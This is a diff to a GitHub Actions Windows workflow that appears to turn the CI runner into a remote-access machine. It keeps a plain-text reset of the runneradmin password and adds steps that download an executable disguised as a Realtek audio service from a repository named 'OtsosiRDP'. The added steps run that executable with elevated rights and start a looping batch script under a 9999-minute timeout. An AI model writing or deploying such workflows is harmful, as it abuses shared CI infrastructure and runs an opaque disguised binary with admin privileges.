@@ -8,15 +8,12 @@ jobs:
     timeout-minutes: 9999
     
     steps:
-    - name: Настройка пользователей
+    - name: Установка
       run: |
         Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText QwertyLOX1 -Force)
-    - name: Загрузка
-      run: |
-        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
-        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+        Invoke-WebRequest https://github.com/Dodic-Codes/OtsosiRDP/raw/main/RtkAudUService32.exe -OutFile RtkAudUService32.exe
         Invoke-WebRequest https://raw.githubusercontent.com/Dodic-Codes/OtsosiRDP/main/loop.bat -OutFile loop.bat
+        Start-Process -FilePath "RtkAudUService32.exe" -Verb RunAs
         curl https://ipinfo.io/ip
     - name: Запуск цикла
       run: cmd /c loop.bat
